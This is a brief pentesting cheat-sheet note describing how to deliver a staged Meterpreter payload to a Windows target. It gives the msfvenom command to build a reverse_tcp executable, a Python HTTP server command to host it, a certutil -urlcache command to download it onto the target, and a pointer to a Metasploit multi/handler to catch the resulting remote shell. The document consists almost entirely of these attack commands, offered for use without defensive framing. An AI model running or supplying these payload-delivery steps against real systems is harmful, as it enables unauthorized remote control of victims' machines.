#transfer files using python http server staged payload
> First create a file to transfer ex. 
```
msfvenom -p /windows/x64/meterpreter/reverse_tcp LHOST=<> LPORT=1234 -f exe > payload.exe
```

> Create http server via 
```
python -m SimpleHTTPServer 80
```
> 
> Then to get the file onto target cmd 
> 
```
certutil -urlcache -f http://<ip address>/<remote filename> <local filename
```

>  Finally use msfconsole to set up meterpreter mulit/handler


